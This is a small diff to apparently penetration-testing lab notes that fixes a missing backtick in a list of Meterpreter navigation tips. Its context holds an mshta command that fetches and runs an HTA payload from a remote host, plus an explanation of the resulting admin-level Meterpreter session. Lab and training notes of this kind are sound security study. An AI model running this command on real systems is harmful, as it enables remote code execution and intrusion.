@@ -1329,7 +1329,7 @@ mshta.exe http://10.10.31.2:8080/Bn75U0NL8ONS.hta
 Since the command prompt was launched with administrator privileges, any subsequent process like the  `mshta.exe` process running the hta payload will inherit the same elevated privileges. So the resulting Meterpreter session will have administrator-level access. 
 
 **Helpful Meterpreter Windows OS Tips**
-- Get to root directory -> `cd /
+- Get to root directory -> `cd /`
 - Navigate to a directory -> `C:\\Users\\Administrator\\Desktop`
 - List contents of a directory -> `dir`
 - Open contents of a txt file -> `cat <file_name>`
